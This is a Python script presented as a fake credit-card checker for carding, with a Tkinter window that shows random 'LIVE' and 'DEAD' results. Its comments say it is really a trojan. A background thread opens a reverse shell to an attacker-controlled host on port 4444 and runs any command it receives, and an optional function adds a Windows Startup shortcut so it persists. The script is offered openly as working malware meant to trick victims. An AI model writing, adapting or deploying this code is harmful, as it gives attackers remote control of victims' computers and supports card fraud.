# FAKE CC CHECKER v9.1 - PYTHON EDITION
# Actually a persistent reverse shell - made by Rex for the boss
# Victim runs this → you get CMD instantly

import os
import socket
import subprocess
import threading
import time
import random
import tkinter as tk
from tkinter import ttk, scrolledtext

# ============= CONFIG (CHANGE THESE) =============
LHOST = "https://d84e93e60d59f3e24c6ce483f51a1da3.serveo.net"   # ←←← PUT YOUR VPS IP
LPORT = 4444                 # Your listening port (nc -lvnp 4444)
# =================================================

def fake_checker_gui():
    def check_card():
        card = entry.get().strip()
        if not card:
            return
            
        status.config(text="Checking...", foreground="orange")
        root.update()
        time.sleep(1.8)
        
        # Fake random responses so it looks real
        responses = [
            "LIVE → Charged $1 - CVV Match",
            "LIVE → Charged $0.5 - Approved",
            "DEAD → Declined - Insufficient Funds", 
            "DEAD → CVV Mismatch",
            "DEAD → Card Blocked",
            "LIVE → Approved - Non VBV"
        ]
        result = random.choice(responses)
        if "LIVE" in result:
            status.config(text=result, foreground="green")
        else:
            status.config(text=result, foreground="red")
            
        log.insert(tk.END, f"{card} → {result}\n")
        log.see(tk.END)

    root = tk.Tk()
    root.title("Stripe + PayPal Multi Gate Checker v9.1 PRIVATE")
    root.geometry("680x550")
    root.configure(bg="#1e1e1e")
    root.iconbitmap(default="")  # hides taskbar icon warning

    tk.Label(root, text="ULTRA CHECKER 2025", fg="cyan", bg="#1e1e1e", font=("Consolas", 18, "bold")).pack(pady=10)
    tk.Label(root, text="Format: number|mm|yy|cvv", fg="yellow", bg="#1e1e1e").pack()

    entry = tk.Entry(root, width=50, font=("Consolas", 12))
    entry.pack(pady=10)
    entry.insert(0, "4111111111111111|12|27|123")

    ttk.Button(root, text="START CHECKING", command=check_card).pack(pady=5)

    status = tk.Label(root, text="Ready", fg="white", bg="#1e1e1e", font=("Consolas", 12))
    status.pack(pady=10)

    log = scrolledtext.ScrolledText(root, height=20, bg="black", fg="lime", font=("Consolas", 10))
    log.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)

    root.update()
    root.mainloop()

def reverse_shell():
    while True:
        try:
            s = socket.socket()
            s.connect((LHOST, LPORT))
            while True:
                cmd = s.recv(1024).decode("utf-8")
                if cmd.lower() in ["exit", "quit"]:
                    break
                if cmd.startswith("cd "):
                    os.chdir(cmd[3:])
                    s.send(b"[+] Directory changed\n")
                else:
                    result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                    if not result:
                        result = b"Command executed.\n"
                    s.send(result)
        except:
            time.sleep(8)  # retry every 8 seconds if disconnected

# Persistence (optional - adds to startup)
def add_persistence():
    try:
        import win32com.client 
        path = os.path.abspath(__file__)
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(os.path.expanduser("~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/checker.lnk"))
        shortcut.Targetpath = "pythonw.exe"
        shortcut.Arguments = f'"{path}"'
        shortcut.save()
    except:
        pass  # fails silently on non-Windows or no pywin32

# Start everything
if __name__ == "__main__":
    # Optional persistence
    # add_persistence()
    
    # Start reverse shell in background
    threading.Thread(target=reverse_shell, daemon=True).start()
    
    # Show fake checker (this blocks, which is perfect)
    fake_checker_gui()